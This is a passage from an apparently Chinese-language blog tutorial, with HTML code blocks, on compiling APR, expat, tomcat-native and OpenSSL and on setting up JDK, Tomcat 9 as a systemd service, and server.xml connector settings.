class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> apr-1.7.0</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure --prefix=/usr/<span class="built_in">local</span>/apr</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make &amp;&amp; make install</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> ../apr-util-1.6.1</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure --prefix=/usr/<span class="built_in">local</span>/apr-util --with-apr=/usr/<span class="built_in">local</span>/apr</span></span><br><span class="line"><span class="meta">#</span><span class="bash">若报类似<span class="comment">#include &lt;expat.h&gt;错误，需要复制expat下的lib到对应的apr-util-1.6.1/xml/expat/lib目录，命令如下:</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> wget https://github.com/libexpat/libexpat/releases/download/R_2_2_9/expat-2.2.9.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar zxvf expat-2.2.9.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure --prefix=/usr/<span class="built_in">local</span>/expat/2_2_9</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make &amp;&amp; make install</span></span><br><span class="line">// /usr/local/bin</span><br><span class="line"><span class="meta">#</span><span class="bash"> ln -s /usr/<span class="built_in">local</span>/expat/2_2_9/bin/xmlwf /usr/<span class="built_in">local</span>/bin/</span></span><br><span class="line"></span><br><span class="line">// /usr/local/include</span><br><span class="line"><span class="meta">#</span><span class="bash"> ln -s /usr/<span class="built_in">local</span>/expat/2_2_9/include/expat.h /usr/<span class="built_in">local</span>/include/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ln -s /usr/<span class="built_in">local</span>/expat/2_2_9/include/expat_config.h /usr/<span class="built_in">local</span>/include/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ln -s /usr/<span class="built_in">local</span>/expat/2_2_9/include/expat_external.h /usr/<span class="built_in">local</span>/include/</span></span><br><span class="line"></span><br><span class="line">// /usr/local/lib</span><br><span class="line"><span class="meta">#</span><span class="bash"> ln -s  /usr/<span class="built_in">local</span>/expat/2_2_9/lib/libexpat.a /usr/<span class="built_in">local</span>/lib/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ln -s  /usr/<span class="built_in">local</span>/expat/2_2_9/lib/libexpat.la /usr/<span class="built_in">local</span>/lib/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ln -s  /usr/<span class="built_in">local</span>/expat/2_2_9/lib/libexpat.so /usr/<span class="built_in">local</span>/lib/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ln -s  /usr/<span class="built_in">local</span>/expat/2_2_9/lib/libexpat.so.1 /usr/<span class="built_in">local</span>/lib/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ln -s  /usr/<span class="built_in">local</span>/expat/2_2_9/lib/libexpat.so.1.6.9 /usr/<span class="built_in">local</span>/lib/</span></span><br><span class="line"></span><br><span class="line">// /usr/local/lib/pkgconfig</span><br><span class="line"><span class="meta">#</span><span class="bash"> ln -s /usr/<span class="built_in">local</span>/expat/2_2_9/lib/pkgconfig/expat.pc /usr/<span class="built_in">local</span>/lib/pkgconfig/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> make &amp;&amp; make install</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> ../apr-iconv-1.2.2</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure --prefix=/usr/<span class="built_in">local</span>/apr-iconv --with-apr=/usr/<span class="built_in">local</span>/apr</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make &amp;&amp; make install</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install libapr1-dev libssl-dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> ../apache-tomcat-9.0.36/bin/tomcat-native-1.2.24-src/native/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo make clean</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure --prefix=/usr/<span class="built_in">local</span>/apr --with-apr=/usr/<span class="built_in">local</span>/apr -with-ssl=yes --with-java-home=/opt/jdk/jdk-11.0.6+10</span></span><br><span class="line"><span class="meta">#</span><span class="bash">若报类似<span class="comment">#include &lt;expat.h&gt;错误，按照上面的操作安装expat</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make &amp;&amp; make install</span></span><br><span class="line"><span class="meta">#</span><span class="bash">注意：要求系统OpenSSL library version &gt;= 1.0.2</span></span><br><span class="line"><span class="meta">#</span><span class="bash">若版本太低，安装native会报错。</span></span><br><span class="line">  </span><br><span class="line">openssl version</span><br><span class="line">  </span><br><span class="line"><span class="meta">#</span><span class="bash">以下是安装openssl操作。若版本已达到1.0.2可以不用参考。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">########################################################</span></span></span><br><span class="line">下载openssl</span><br><span class="line">wget https://www.openssl.org/source/openssl-1.0.2j.tar.gz</span><br><span class="line">tar zxvf openssl-1.0.2j.tar.gz</span><br><span class="line">cd openssl</span><br><span class="line">./config --prefix=/usr/local/openssl -fPIC</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">mv /usr/bin/openssl ~   //备份</span><br><span class="line">ln -s /usr/local/openssl/bin/openssl /usr/bin/openssl //替换最新openssl执行文件</span><br><span class="line">openssl version  //查看openssl版本是否已替换</span><br><span class="line">  </span><br><span class="line"><span class="meta">#</span><span class="bash">安装成功后，可再次执行tomcat-native</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>2.3配置环境变量</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nano &#x2F;etc&#x2F;profile</span><br><span class="line">#添加：export LD_LIBRARY_PATH&#x3D;$LD_LIBRARY_PATH:&#x2F;usr&#x2F;local&#x2F;apr&#x2F;lib</span><br><span class="line"></span><br><span class="line">$ nano &#x2F;etc&#x2F;bashrc</span><br><span class="line">#添加：export LD_LIBRARY_PATH&#x3D;$LD_LIBRARY_PATH:&#x2F;usr&#x2F;local&#x2F;apr&#x2F;lib</span><br><span class="line"></span><br><span class="line">$ source &#x2F;etc&#x2F;profile</span><br><span class="line">$ source &#x2F;etc&#x2F;bashrc</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="可能遇到的apr问题"><a href="#可能遇到的apr问题" class="headerlink" title="可能遇到的apr问题"></a>可能遇到的apr问题</h3><p>apache.catalina.core.AprLifecycleListener [175] : Failed to initialize the SSLEngine.<br>org.apache.tomcat.jni.Error: 70023: This function has not been implemented on this platform</p><p>需要安装对应的包： <code>sudo apt-get install libapr1-dev libssl-dev</code>, 然后在<code>tomcat-native-1.2.24-src/native/</code>中重新编译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo make clean</span><br><span class="line">.&#x2F;configure </span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h2 id="JDK-和-tomcat-安装-更新到2019年8月10日"><a href="#JDK-和-tomcat-安装-更新到2019年8月10日" class="headerlink" title="JDK 和 tomcat 安装[更新到2019年8月10日]"></a>JDK 和 tomcat 安装[更新到2019年8月10日]</h2><p><a href="https://www.digitalocean.com/community/tutorials/install-tomcat-9-debian-9" target="_blank" rel="noopener">JDK安装步骤参考</a></p><ol><li>JDK11安装步骤</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> 进入Jenkins目录：https://github.com/AdoptOpenJDK/openjdk11-binaries/releases/download/jdk-11.0.8%2B10/OpenJDK11U-jdk_x64_linux_hotspot_11.0.8_10.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash">  tar -zxvf OpenJDK11U-jdk_x64_linux_hotspot_11.0.8_10.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nano /etc/profile</span></span><br><span class="line">export JAVA_HOME=/opt/jdk-11.0.8+10</span><br><span class="line">export PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> . /etc/profile</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> java -version</span></span><br></pre></td></tr></table></figure><ol start="2"><li>JDK8安装步骤</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget  https://download.oracle.com/otn-pub/java/jdk/8u191-b12/2787e4a523244c269598db4e85c51e0c/jdk-8u191-linux-x64.tar.gz</span><br><span class="line">mkdir /opt/jdk</span><br><span class="line">tar -C /opt/jdk  -zxf /home/jdk-8u191-linux-x64.tar.gz</span><br><span class="line">update-alternatives --install /usr/bin/java java /opt/jdk/jdk1.8.0_191/bin/java 1</span><br><span class="line">update-alternatives --install /usr/bin/javac javac /opt/jdk/jdk1.8.0_191/bin/javac 1</span><br><span class="line">java -version</span><br><span class="line">javac </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;mirrors.advancedhosters.com&#x2F;apache&#x2F;tomcat&#x2F;tomcat-9&#x2F;v9.0.14&#x2F;bin&#x2F;apache-tomcat-9.0.14.tar.gz</span><br><span class="line">useradd -rs &#x2F;bin&#x2F;false tomcat 注意如果部署到nginx最好这个用户是nginx的用户www-data用户，这样创建文件的时候UMask不会错误。</span><br><span class="line">mkdir &#x2F;opt&#x2F;tomcat</span><br><span class="line">chown -R www-data:www-data apache-tomcat</span><br></pre></td></tr></table></figure><h2 id="tomcat启动脚本"><a href="#tomcat启动脚本" class="headerlink" title="tomcat启动脚本"></a>tomcat启动脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;Tomcat9</span><br><span class="line">After&#x3D;network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type&#x3D;forking</span><br><span class="line">User&#x3D;www-data</span><br><span class="line">Group&#x3D;www-data</span><br><span class="line"># 创建文件的默认属性设置</span><br><span class="line">UMask&#x3D;0022</span><br><span class="line"></span><br><span class="line">Environment&#x3D;CATALINA_PID&#x3D;&#x2F;opt&#x2F;tomcat&#x2F;apache-tomcat-9.0.14&#x2F;tomcat9.pid</span><br><span class="line">Environment&#x3D;TOMCAT_JAVA_HOME&#x3D;&#x2F;usr&#x2F;bin&#x2F;java</span><br><span class="line">Environment&#x3D;CATALINA_HOME&#x3D;&#x2F;opt&#x2F;tomcat&#x2F;apache-tomcat-9.0.14</span><br><span class="line">Environment&#x3D;CATALINA_BASE&#x3D;&#x2F;opt&#x2F;tomcat&#x2F;apache-tomcat-9.0.14</span><br><span class="line">Environment&#x3D;CATALINA_OPTS&#x3D;</span><br><span class="line">Environment&#x3D;&quot;JAVA_OPTS&#x3D;-Dfile.encoding&#x3D;UTF-8 -Dnet.sf.ehcache.skipUpdateCheck&#x3D;true -XX:+UseConcMarkSweepGC -XX:+CMSClassUnloadingEnabled -XX:+UseParNewGC -XX:MaxPermSize&#x3D;528m -Xms512m -Xmx512m&quot;</span><br><span class="line"></span><br><span class="line">ExecStart&#x3D;&#x2F;opt&#x2F;tomcat&#x2F;apache-tomcat-9.0.14&#x2F;bin&#x2F;startup.sh</span><br><span class="line">ExecStop&#x3D;&#x2F;bin&#x2F;kill -15 $MAINPID</span><br><span class="line"></span><br><span class="line"># 重启参数</span><br><span class="line">RestartSec&#x3D;10</span><br><span class="line">Restart&#x3D;always</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure><h2 id="查看tomcat启动状态"><a href="#查看tomcat启动状态" class="headerlink" title="查看tomcat启动状态"></a>查看tomcat启动状态</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># systemctl daemon-reload</span><br><span class="line"># systemctl start tomcat</span><br><span class="line"># systemctl enable tomcat</span><br><span class="line"># tail -f -n 150 &#x2F;opt&#x2F;tomcat&#x2F;apache-tomcat-9.0.14&#x2F;logs&#x2F;catalina.2018-12-24.log</span><br><span class="line"></span><br><span class="line">## Systemctl error</span><br><span class="line">systemctl failed error log: </span><br><span class="line">&gt; journalctl -xe</span><br></pre></td></tr></table></figure><h2 id="setenv-sh文件-配置tomcat于springboot的profile参数"><a href="#setenv-sh文件-配置tomcat于springboot的profile参数" class="headerlink" title="setenv.sh文件 配置tomcat于springboot的profile参数"></a><code>setenv.sh</code>文件 配置tomcat于<code>springboot</code>的profile参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># REM 切换不同的spring环境</span><br><span class="line"># SET JAVA_OPTS&#x3D;%JAVA_OPTS% -Dspring.profiles.active&#x3D;dev</span><br><span class="line">#  ----------------------------------linux 配置脚本 -------------------------------------------------</span><br><span class="line"># REM 参考地址： https:&#x2F;&#x2F;www.javacodegeeks.com&#x2F;2012&#x2F;06&#x2F;spring-31-profiles-and-tomcat.html, 设置内存</span><br><span class="line">JAVA_OPTS&#x3D;&quot;$JAVA_OPTS -Xms2512M -Xmx2512M -XX:PermSize&#x3D;64M -XX:MaxNewSize&#x3D;128M -XX:MaxPermSize&#x3D;128M -Dspring.profiles.active&#x3D;prod&quot;</span><br><span class="line"># REM 参考文档： https:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;18812762&#x2F;the-apr-based-apache-tomcat-native-library-was-not-found-on-the-java-library-pat</span><br><span class="line"># REM 错误信息： The APR based Apache Tomcat Native library was not found on the java.library.path</span><br><span class="line"># REM 配置脚本： 下面的是针对Linux环境的，默认安装apr和tomcat-native包后的地址，Linux安装步骤参考gist中说明</span><br><span class="line">export LD_LIBRARY_PATH&#x3D;$LD_LIBRARY_PATH:&#x2F;usr&#x2F;local&#x2F;apr&#x2F;lib</span><br></pre></td></tr></table></figure><h2 id="tomcat的配置，配置BIO-NIO-也就是最大连接数和处理连接数的线程池的大小"><a href="#tomcat的配置，配置BIO-NIO-也就是最大连接数和处理连接数的线程池的大小" class="headerlink" title="tomcat的配置，配置BIO/NIO,也就是最大连接数和处理连接数的线程池的大小"></a>tomcat的配置，配置BIO/NIO,也就是最大连接数和处理连接数的线程池的大小</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">  Licensed to the Apache Software Foundation (ASF) under one or more</span><br><span class="line">  contributor license agreements.  See the NOTICE file distributed with</span><br><span class="line">  this work for additional information regarding copyright ownership.</span><br><span class="line">  The ASF licenses this file to You under the Apache License, Version 2.0</span><br><span class="line">  (the &quot;License&quot;); you may not use this file except in compliance with</span><br><span class="line">  the License.  You may obtain a copy of the License at</span><br><span class="line"></span><br><span class="line">      http:&#x2F;&#x2F;www.apache.org&#x2F;licenses&#x2F;LICENSE-2.0</span><br><span class="line"></span><br><span class="line">  Unless required by applicable law or agreed to in writing, software</span><br><span class="line">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line">  See the License for the specific language governing permissions and</span><br><span class="line">  limitations under the License.</span><br><span class="line">--&gt;</span><br><span class="line">&lt;!-- Note:  A &quot;Server&quot; is not itself a &quot;Container&quot;, so you may not</span><br><span class="line">     define subcomponents such as &quot;Valves&quot; at this level.</span><br><span class="line">     Documentation at &#x2F;docs&#x2F;config&#x2F;server.html</span><br><span class="line"> --&gt;</span><br><span class="line">&lt;Server port&#x3D;&quot;8005&quot; shutdown&#x3D;&quot;SHUTDOWN&quot;&gt;</span><br><span class="line">  &lt;Listener className&#x3D;&quot;org.apache.catalina.startup.VersionLoggerListener&quot; &#x2F;&gt;</span><br><span class="line">  &lt;!-- Security listener. Documentation at &#x2F;docs&#x2F;config&#x2F;listeners.html</span><br><span class="line">  &lt;Listener className&#x3D;&quot;org.apache.catalina.security.SecurityListener&quot; &#x2F;&gt;</span><br><span class="line">  --&gt;</span><br><span class="line">  &lt;!--APR library loader. Documentation at &#x2F;docs&#x2F;apr.html --&gt;</span><br><span class="line">  &lt;Listener className&#x3D;&quot;org.apache.catalina.core.AprLifecycleListener&quot; SSLEngine&#x3D;&quot;on&quot; &#x2F;&gt;</span><br><span class="line">  &lt;!-- Prevent memory leaks due to use of particular java&#x2F;javax APIs--&gt;</span><br><span class="line">  &lt;Listener className&#x3D;&quot;org.apache.catalina.core.JreMemoryLeakPreventionListener&quot; &#x2F;&gt;</span><br><span class="line">  &lt;Listener className&#x3D;&quot;org.apache.catalina.mbeans.GlobalResourcesLifecycleListener&quot; &#x2F;&gt;</span><br><span class="line">  &lt;Listener className&#x3D;&quot;org.apache.catalina.core.ThreadLocalLeakPreventionListener&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- Global JNDI resources</span><br><span class="line">       Documentation at &#x2F;docs&#x2F;jndi-resources-howto.html</span><br><span class="line">  --&gt;</span><br><span class="line">  &lt;GlobalNamingResources&gt;</span><br><span class="line">    &lt;!-- Editable user database that can also be used by</span><br><span class="line">         UserDatabaseRealm to authenticate users</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;Resource name&#x3D;&quot;UserDatabase&quot; auth&#x3D;&quot;Container&quot;</span><br><span class="line">              type&#x3D;&quot;org.apache.catalina.UserDatabase&quot;</span><br><span class="line">              description&#x3D;&quot;User database that can be updated and saved&quot;</span><br><span class="line">              factory&#x3D;&quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot;</span><br><span class="line">              pathname&#x3D;&quot;conf&#x2F;tomcat-users.xml&quot; &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;GlobalNamingResources&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- A &quot;Service&quot; is a collection of one or more &quot;Connectors&quot; that share</span><br><span class="line">       a single &quot;Container&quot; Note:  A &quot;Service&quot; is not itself a &quot;Container&quot;,</span><br><span class="line">       so you may not define subcomponents such as &quot;Valves&quot; at this level.</span><br><span class="line">       Documentation at &#x2F;docs&#x2F;config&#x2F;service.html</span><br><span class="line">   --&gt;</span><br><span class="line">  &lt;Service name&#x3D;&quot;Catalina&quot;&gt;</span><br><span class="line">    &lt;!-- &lt;Executor name&#x3D;&quot;tomcatThreadPool&quot; </span><br><span class="line">        namePrefix&#x3D;&quot;tomcat-thread-&quot;</span><br><span class="line">        maxThreads&#x3D;&quot;200&quot;</span><br><span class="line">        minSpareThreads&#x3D;&quot;4&quot;&#x2F;&gt; --&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;!-- A &quot;Connector&quot; represents an endpoint by which requests are received</span><br><span class="line">         and responses are returned. Documentation at :</span><br><span class="line">         Java HTTP Connector: &#x2F;docs&#x2F;config&#x2F;http.html</span><br><span class="line">         Java AJP  Connector: &#x2F;docs&#x2F;config&#x2F;ajp.html</span><br><span class="line">         APR (HTTP&#x2F;AJP) Connector: &#x2F;docs&#x2F;apr.html</span><br><span class="line">         Define a non-SSL&#x2F;TLS HTTP&#x2F;1.1 Connector on port 8080</span><br><span class="line">         参考文档参数： https:&#x2F;&#x2F;tomcat.apache.org&#x2F;tomcat-9.0-doc&#x2F;config&#x2F;http.html</span><br><span class="line">         采用线程池的技术来控制tomcat，不用再重新开启一个线程针对每个http请求</span><br><span class="line">          1. maxThreads default&#x3D;200，代表初始的处理器请求的线程池大小，worker数量 ,并发数量</span><br><span class="line">          2. minSpareThreads default&#x3D;25, 空闲使用中的线程池数量</span><br><span class="line">          3. maxConnections 允许的最多tcp连接数</span><br><span class="line">          4. acceptCount 超过maxConnections后运行的最多客户端         </span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;Connector </span><br><span class="line">               port&#x3D;&quot;8080&quot; protocol&#x3D;&quot;org.apache.coyote.http11.Http11NioProtocol&quot;</span><br><span class="line">               maxConnections&#x3D;&quot;20000&quot;</span><br><span class="line">               acceptCount&#x3D;&quot;100&quot;</span><br><span class="line">               maxThreads&#x3D;&quot;1000&quot;</span><br><span class="line">               minSpareThreads&#x3D;&quot;4&quot;</span><br><span class="line">               connectionTimeout&#x3D;&quot;20000&quot;</span><br><span class="line">               redirectPort&#x3D;&quot;8443&quot; &#x2F;&gt;</span><br><span class="line">    &lt;!-- A &quot;Connector&quot; using the shared thread pool--&gt;</span><br><span class="line">    &lt;!--</span><br><span class="line">    &lt;Connector executor&#x3D;&quot;tomcatThreadPool&quot;</span><br><span class="line">               port&#x3D;&quot;8080&quot; protocol&#x3D;&quot;HTTP&#x2F;1.1&quot;</span><br><span class="line">               connectionTimeout&#x3D;&quot;20000&quot;</span><br><span class="line">               redirectPort&#x3D;&quot;8443&quot; &#x2F;&gt;</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;!-- Define a SSL&#x2F;TLS HTTP&#x2F;1.1 Connector on port 8443</span><br><span class="line">         This connector uses the NIO implementation. The default</span><br><span class="line">         SSLImplementation will depend on the presence of the APR&#x2F;native</span><br><span class="line">         library and the useOpenSSL attribute of the</span><br><span class="line">         AprLifecycleListener.</span><br><span class="line">         Either JSSE or OpenSSL style configuration may be used regardless of</span><br><span class="line">         the SSLImplementation selected. JSSE style configuration is used below.</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;!--</span><br><span class="line">    &lt;Connector port&#x3D;&quot;8443&quot; protocol&#x3D;&quot;org.apache.coyote.http11.Http11NioProtocol&quot;</span><br><span class="line">               maxThreads&#x3D;&quot;150&quot; SSLEnabled&#x3D;&quot;true&quot;&gt;</span><br><span class="line">        &lt;SSLHostConfig&gt;</span><br><span class="line">            &lt;Certificate certificateKeystoreFile&#x3D;&quot;conf&#x2F;localhost-rsa.jks&quot;</span><br><span class="line">                         type&#x3D;&quot;RSA&quot; &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;SSLHostConfig&gt;</span><br><span class="line">    &lt;&#x2F;Connector&gt;</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;!-- Define a SSL&#x2F;TLS HTTP&#x2F;1.1 Connector on port 8443 with HTTP&#x2F;2</span><br><span class="line">         This connector uses the APR&#x2F;native implementation which always uses</span><br><span class="line">         OpenSSL for TLS.</span><br><span class="line">         Either JSSE or OpenSSL style configuration may be used. OpenSSL style</span><br><span class="line">         configuration is used below.</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;!--</span><br><span class="line">    &lt;Connector port&#x3D;&quot;8443&quot; 